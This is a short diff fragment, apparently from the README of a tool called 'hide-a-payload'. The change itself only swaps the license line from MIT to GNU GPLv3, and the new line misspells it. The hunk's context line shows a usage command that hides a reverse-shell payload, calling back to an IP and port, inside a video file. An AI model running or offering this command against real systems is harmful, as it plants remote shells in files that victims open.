@@ -106,7 +106,7 @@ python hide-a-payload.py -p reverse_shell -i 192.168.1.100 -r 4444 -f video.mp4 
 
 License
 
-This project is licensed under the MIT License.
+This project is licensed under the GNU GPlv3.
 
 Acknowledgements
 
